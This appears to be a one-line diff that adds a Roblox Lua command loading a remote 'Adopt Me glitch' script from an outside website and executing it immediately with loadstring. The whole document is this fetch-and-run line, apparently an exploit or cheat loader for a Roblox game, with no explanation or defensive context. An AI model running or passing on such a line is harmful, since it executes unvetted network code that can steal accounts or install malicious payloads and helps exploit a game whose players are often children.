@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://giscript.org/scripts/adoptmeglitch/AdoptMe.lua"))()
